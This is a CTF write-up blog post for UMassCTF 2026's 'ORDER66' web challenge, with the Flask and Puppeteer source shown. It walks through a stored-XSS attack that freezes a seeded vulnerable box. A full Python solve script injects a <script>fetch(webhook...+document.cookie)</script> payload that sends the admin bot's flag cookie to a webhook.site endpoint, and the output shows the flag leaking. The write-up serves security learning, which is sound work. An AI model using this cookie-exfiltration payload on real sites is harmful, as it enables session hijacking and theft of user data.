---
layout: post
title:  "ORDER66"
date:   2026-04-13 18:52:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /UMassCTF-2026-order66/
---

**Category**: web easy

**Author**: lordbravenick

**Description**: See if you can figure out what order to execute... [http://order66.web.ctf.umasscybersec.org:32768/](http://order66.web.ctf.umasscybersec.org:32768/)

I get the challenge files:
```shell
unzip DOWNLOADABLE_ASSETS.zip  
Archive:  DOWNLOADABLE_ASSETS.zip  
  inflating: app.py  
  inflating: compose.yaml  
  inflating: Dockerfile  
  inflating: package.json  
  inflating: package-lock.json  
  inflating: requirements.txt  
   creating: static/  
   creating: static/css/  
  inflating: static/css/style.css  
   creating: templates/  
  inflating: templates/admin.html  
  inflating: templates/index.html  
  inflating: app.js
```
{% raw %}
`app.js`:
```js
const puppeteer = require('puppeteer');
require('dotenv').config();

const FLAG = process.env.FLAG;

async function checkUrl(targetUrl, vulnIndex) {
    const browser = await puppeteer.launch({
        headless: "new",
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || 'chromium',
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox', 
            '--disable-gpu',
            '--disable-dev-shm-usage'
        ]
    });

    try {
        const page = await browser.newPage();

        page.on('console', msg => console.log(msg.text()));

        const parsedUrl = new URL(targetUrl);
        
        await page.setCookie({
            name: 'flag',
            value: FLAG,
            domain: parsedUrl.hostname,
            path: '/',
            httpOnly: false,
            secure: false,
            sameSite: 'Lax'
        });


        await page.goto(targetUrl, { 
            waitUntil: 'domcontentloaded', 
            timeout: 15000 
        });

        await new Promise(r => setTimeout(r, 5000));

    } catch (e) {
    } finally {
        await browser.close();
    }
}

if (require.main === module) {
    const args = process.argv.slice(2);
    if (args.length >= 2) {
        checkUrl(args[0], args[1]);
    }
}
```

`app.py`:
```python
from flask import Flask, render_template, session, request
import random
import os
import redis
import uuid
import subprocess
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY")
PORT = int(os.getenv('PORT'))
REDIS_HOST = os.getenv('REDIS_HOST', 'redis')
host = os.getenv('Host')

db = redis.Redis(host=REDIS_HOST, port=6379, decode_responses=True)
db.flushdb()

def get_grid_context(uid, seed):
    random.seed(seed) 
    v_index = random.randint(1, 66)
    data = {i: (db.get(f"{uid}:box_{i}") or "") for i in range(1, 67)}
    return data, v_index

@app.route("/", methods=['GET', 'POST'])
def hello_world():
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
        session['seed'] = random.randint(1000, 9999)

    uid = session['user_id']
    
    current_seed = session.get('seed', random.randint(1000, 9999))
    _, current_vuln_index = get_grid_context(uid, current_seed)

    current_content = db.get(f"{uid}:box_{current_vuln_index}") or ""
    
    is_payload_present = "<script" in current_content.lower() or "alert(" in current_content.lower()

    if request.method == 'POST':
        submitted = [int(k.split('_')[1]) for k in request.form if k.startswith('box_') and request.form[k].strip()]
        
        if len(submitted) > 1:
            return "ERROR: Only ONE box allowed.", 400
        
        for i in range(1, 67):
            content = request.form.get(f'box_{i}')
            if content and i in submitted:
                db.set(f"{uid}:box_{i}", content)
                if i == current_vuln_index and ("<script" in content.lower() or "alert(" in content.lower()):
                    is_payload_present = True
            else:
                db.delete(f"{uid}:box_{i}")

    if not is_payload_present:
        session['seed'] = random.randint(1000, 9999)
    else:
        session['seed'] = current_seed 

    seed = session['seed']
    grid_data, vuln_index = get_grid_context(uid, seed)
    
    return render_template('index.html', vuln_index=vuln_index, grid_data=grid_data, user_id=uid, seed=seed, host=host)

@app.route("/view/<uid>/<int:seed>")
def view_grid(uid, seed):
    grid_data, vuln_index = get_grid_context(uid, seed)
    return render_template('index.html', vuln_index=vuln_index, grid_data=grid_data, user_id=uid, seed=seed,host=host)

@app.route("/admin")
def admin_page():
    return render_template('admin.html')

from urllib.parse import urlparse

@app.route("/admin/visit", methods=['POST'])
def admin_visit():
    target_url = request.form.get('target_url')
    if not target_url or not target_url.startswith("http://"):
        return "ERROR: Invalid Domain."

    # --- ADD THIS TRANSLATION LOGIC ---
    try:
        parsed_url = urlparse(target_url)
        # In Docker, 'web' is the service name, and PORT is your env var
        # This turns http://localhost:8080 into http://web:80
        internal_target = target_url.replace(parsed_url.netloc, f"web:{PORT}")
        
        parts = target_url.rstrip('/').split('/')
        target_seed = int(parts[-1])
        target_uid = parts[-2]
        _, vuln_index = get_grid_context(target_uid, target_seed)
    except Exception as e:
        return f"ERROR: Parsing failed: {str(e)}"

    bot_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'app.js')

    try:
        process = subprocess.run(
            ['node', bot_path, internal_target, str(vuln_index)], # Use internal_target!
            capture_output=True, 
            text=True, 
            timeout=25, 
            shell=False,
            env=os.environ
        )
        
        # If process.stdout is empty, it usually means Node crashed
        return process.stdout if process.stdout else f"Bot Error: {process.stderr}"
    except Exception as e:
        return f"System Error: {str(e)}"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=PORT, debug=False)
```

`index.html`:
```html
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Order 66</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>
    <h1>Execute Order... wait which one was it?</h1>
    <center><h3>Go to the chancellor <a href="/admin">here</a></h3></center>

    <div class="share-container" style="margin: 20px auto; max-width: 800px; padding: 15px; background: #111; border: 1px solid #00ff00; font-family: monospace;">
        <label style="color: #00ff00;">Logs for the chancellor:</label>
        <div style="display: flex; gap: 10px; margin-top: 10px;">
            <input type="text" id="shareUrl" readonly="" value="http://{{ host }}/view/{{ user_id }}/{{ seed }}" style="flex-grow: 1; background: #000; color: #0ff; border: 1px solid #0ff; padding: 8px;">
            <button onclick="copyUrl()" style="background: #00ff00; color: #000; border: none; padding: 8px 20px; cursor: pointer; font-weight: bold; font-family: inherit;">
                COPY_URL
            </button>
        </div>
        <p id="copyStatus" style="font-size: 0.8rem; color: #00ff00; margin-top: 10px; display: none;">&gt;&gt; ROGER ROGER</p>
    </div>

    <form method="POST">
        <div class="grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; padding: 20px;">
            {% for i in range(1, 67) %}
        <div class="box box-{{ i }}" style="padding: 10px; border: 1px solid #333; background: #0a0a0a;">
                
                <label style="color: #666; font-size: 0.8rem; display: block; margin-bottom: 5px;">ORDER_{{ i }}</label>
                
                <div class="output" style="min-height: 20px; color: #fff; margin-bottom: 10px;">
                    {% set content = grid_data[i] %}
                    
                    {% if i == vuln_index %}
                        {{ content | safe }}
                    {% else %}
                        {{ content }}
                    {% endif %}
                </div>

                <input type="text" name="box_{{ i }}" value="{{ content }}" placeholder="Enter data..." autocomplete="off" style="width: 100%; background: #1a1a1a; color: #00ff00; border: 1px solid #333; padding: 5px;">
            </div>
            {% endfor %}
        </div>

        <div style="text-align: center; margin-bottom: 50px;">
            <button type="submit" class="transmit-btn" style="padding: 15px 40px; font-size: 1.2rem; background: #00ff00; color: #000; border: none; cursor: pointer; font-weight: bold;">
                TRANSMIT DATA TO THE CHANCELLOR
            </button>
        </div>
    </form>

    <script id="session-logic">
        function copyUrl() {
            const copyText = document.getElementById("shareUrl");
            const status = document.getElementById("copyStatus");
            copyText.select();
            copyText.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(copyText.value);
            status.style.display = "block";
            setTimeout(() => { status.style.display = "none"; }, 2000);
        }

        const bot_uid = "{{ user_id }}";
        const bot_seed = "{{ seed }}"; 
    </script>


</body></html>
```

`admin.html`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galactic Empire Logs</title>
    
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>

<div class="admin-container" style="max-width: 800px; margin: 100px auto; padding: 20px;">
    <h1>Galactic Empire Link Checker</h1>
    
    <div class="input-box" style="display: flex; flex-direction: column; gap: 20px;">
        <label>SYSTEM : Your command needs to be checked before it goes to the chancellor</label>
        
        <input type="url" id="target_url" 
               placeholder="Enter URL..." 
               required 
               style="width: 100%; padding: 15px;">
        
        <button onclick="dispatchBot()" class="transmit-btn" style="margin: 0 auto;">
            EXECUTE
        </button>
    </div>

    <div id="bot-terminal" style="display:none; margin-top: 40px; border-left: 3px solid #0f0; padding-left: 20px;">
        <h3 style="font-size: 0.8rem; color: #666;">System...</h3>
        <pre id="log-content" style="color: #0f0; white-space: pre-wrap; font-family: inherit;"></pre>
    </div>

    <div style="margin-top: 40px; text-align: center;">
        <a href="/" style="color: #0f0; text-decoration: none; font-size: 0.8rem;">
            << BACK
        </a>
    </div>
</div>

<script>
async function dispatchBot() {
    const urlInput = document.getElementById('target_url');
    const logBox = document.getElementById('bot-terminal');
    const logContent = document.getElementById('log-content');
    const btn = document.querySelector('.transmit-btn');

    if (!urlInput.value) return alert("URL Required.");

    logBox.style.display = 'block';
    btn.disabled = true;
    logContent.innerText = "...";

    try {
        const response = await fetch('/admin/visit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `target_url=${encodeURIComponent(urlInput.value)}`
        });

        logContent.innerText = await response.text(); 
    } catch (e) {
        logContent.innerText = "CRITICAL ERROR: Bot did not return.";
    } finally {
        btn.disabled = false;
    }
}
</script>


</body>
</html>
```

The `user_id` and `seed` is in both the url generated on the page and the flask session cookie:
```shell
echo "eyJzZWVkIjo2NDAzLCJ1c2VyX2lkIjoiMjEyOTRhMWEtMTNlOS00NTA5LWE2YTctYzFkNmI2YTY4MjA3In0.adsY6A.JsxxRKtDdHHm3FywMAUvU38kBT0" | base64 -d  
{"seed":6403,"user_id":"21294a1a-13e9-4509-a6a7-c1d6b6a68207"}base64: invalid input # error just from trying to decode signature 
```

Example of link: `http://None/view/21294a1a-13e9-4509-a6a7-c1d6b6a68207/6403`

![Alt text](/images/umassweb4.png)

On the page is a matrix of 66 boxes with a vulnerable box at an index determined by the given the seed. For example sending a POST request to `/` allows you to set one of 66 boxes:
```http
POST / HTTP/1.1
Host: order66.web.ctf.umasscybersec.org:32768
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://order66.web.ctf.umasscybersec.org:32768/
Content-Type: application/x-www-form-urlencoded
Content-Length: 520
Origin: http://order66.web.ctf.umasscybersec.org:32768
DNT: 1
Connection: keep-alive
Cookie: session=eyJzZWVkIjo3NzQ5LCJ1c2VyX2lkIjoiMjEyOTRhMWEtMTNlOS00NTA5LWE2YTctYzFkNmI2YTY4MjA3In0.adsZrg.zi9gqt0NIqdL3gYuJaG43RCHeCc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

box_1=&box_2=&box_3=&box_4=&box_5=&box_6=&box_7=&box_8=&box_9=&box_10=&box_11=&box_12=&box_13=&box_14=&box_15=&box_16=&box_17=&box_18=&box_19=&box_20=&box_21=&box_22=&box_23=&box_24=&box_25=&box_26=&box_27=&box_28=&box_29=&box_30=&box_31=&box_32=&box_33=&box_34=&box_35=&box_36=&box_37=&box_38=&box_39=&box_40=&box_41=&box_42=&box_43=&box_44=&box_45=&box_46=&box_47=&box_48=&box_49=&box_50=&box_51=&box_52=&box_53=&box_54=&box_55=&box_56=&box_57=&box_58=&box_59=&box_60=&box_61=&box_62=&box_63=&box_64=&box_65=&box_66=
```

Submitting a payload with `<script` into the correct box (payload must contain `<script` or `alert(`) freezes the seed so the bots visit sees the same vulnerable box. This is because `is_payload_present` becomes `True` and the server keeps the same seed instead of generating a new random one. The bot has the flag in its cookie and will execute the js and leak the flag to my webhook:
```js
await page.setCookie({
    name: 'flag',
    value: FLAG,
    domain: parsedUrl.hostname,
    path: '/',
    httpOnly: false,
    secure: false,
    sameSite: 'Lax'
});
```

Example: sending a failed request to `/admin/visit`:
```http
POST /admin/visit HTTP/1.1
Host: order66.web.ctf.umasscybersec.org:32768
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://order66.web.ctf.umasscybersec.org:32768/admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Origin: http://order66.web.ctf.umasscybersec.org:32768
DNT: 1
Connection: keep-alive
Cookie: session=eyJzZWVkIjoyMDQxLCJ1c2VyX2lkIjoiMjEyOTRhMWEtMTNlOS00NTA5LWE2YTctYzFkNmI2YTY4MjA3In0.adsZsg.hBIusgPmmDmw5PumVK5hpeUCOE0
Priority: u=0

target_url=http%3A%2F%2FNone%2Fview%2F21294a1a-13e9-4509-a6a7-c1d6b6a68207%2F2041
```

Response:
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.10.20
Date: Sun, 12 Apr 2026 04:04:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 153
Connection: close

◇ injecting env (0) from .env // tip: ⌘ suppress logs { quiet: true }
Failed to load resource: the server responded with a status of 404 (NOT FOUND)
```

Solve script:
```python
#!/usr/bin/env python3
import re
import random
import requests
from bs4 import BeautifulSoup

TARGET_URL = "http://order66.web.ctf.umasscybersec.org:32768"
WEBHOOK_URL = "https://webhook.site/5b8112d0-4e0d-496f-920e-0fd3da66a9c6"

def get_seed_and_uid(html):
    """Extract seed and user_id from the shareUrl input value."""
    soup = BeautifulSoup(html, 'html.parser')
    share_input = soup.find('input', id='shareUrl')
    if not share_input:
        raise Exception("Could not find shareUrl input")
    value = share_input.get('value', '')
    # Format: http://host/view/<uid>/<seed>
    match = re.search(r'/view/([^/]+)/(\d+)', value)
    if not match:
        raise Exception("Could not parse shareUrl")
    uid, seed = match.groups()
    return uid, int(seed)

def get_vulnerable_box(seed):
    """Recreate the servers random selection"""
    random.seed(seed)
    return random.randint(1, 66)

def build_form_data(vuln_index, payload):
    """Create POST data with one non empty box"""
    data = {}
    for i in range(1, 67):
        data[f'box_{i}'] = payload if i == vuln_index else ''
    return data

def main():
    sess = requests.Session()

    # get initial session and extract seed and uid
    print("Fetching initial page...")
    resp = sess.get(TARGET_URL)
    resp.raise_for_status()
    uid, seed = get_seed_and_uid(resp.text)
    print(f"User ID: {uid}, Seed: {seed}")

    # determine vulnerable box
    vuln_index = get_vulnerable_box(seed)
    print(f"Vulnerable box index: {vuln_index}")

    # build XSS payload
    payload = f"<script>fetch('{WEBHOOK_URL}?c=' + document.cookie)</script>"
    print(f"Using payload: {payload[:150]}...")

    # submit payload into the vulnerable box
    form_data = build_form_data(vuln_index, payload)
    print("Submitting payload...")
    resp2 = sess.post(TARGET_URL, data=form_data)
    resp2.raise_for_status()

    # verify seed hasnt changed just because
    _, new_seed = get_seed_and_uid(resp2.text)
    if new_seed == seed:
        print("Seed frozen. Payload is now persistent.")
    else:
        print("Seed changed! Something went wrong :(")
        return

    # build the shareable URL the bot will visit
    view_url = f"{TARGET_URL}/view/{uid}/{seed}"
    print(f"View URL: {view_url}")

    # ask the admin bot to visit
    print("Sending bot to the view URL...")
    admin_resp = sess.post(
        f"{TARGET_URL}/admin/visit",
        data={"target_url": view_url},
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    print("Bot response:")
    print(admin_resp.text)

if __name__ == "__main__":
    main()
```

Output:
```shell
python3 solve6.py  
Fetching initial page...  
User ID: 5beba6da-162a-422e-a390-846a4d0e905c, Seed: 1302  
Vulnerable box index: 62  
Using payload: <script>fetch('https://webhook.site/5b8112d0-4e0d-496f-920e-0fd3da66a9c6?c=' + document.cookie)</script>...  
Submitting payload...  
Seed frozen. Payload is now persistent.  
View URL: http://order66.web.ctf.umasscybersec.org:32768/view/5beba6da-162a-422e-a390-846a4d0e905c/1302  
Sending bot to the view URL...  
Bot response:  
◇ injecting env (0) from .env // tip: ⌘ enable debugging { debug: true }  
Failed to load resource: the server responded with a status of 404 (NOT FOUND)  
Access to fetch at 'https://webhook.site/5b8112d0-4e0d-496f-920e-0fd3da66a9c6?c=flag=UMASS{m@7_t53_f0rce_b$_w!th_y8u}' from origin 'http://web' has been blocked by CORS policy  
: No 'Access-Control-Allow-Origin' header is present on the requested resource.  
Failed to load resource: net::ERR_FAILED
```
{% endraw %}
`UMASS{m@7_t53_f0rce_b$_w!th_y8u}`
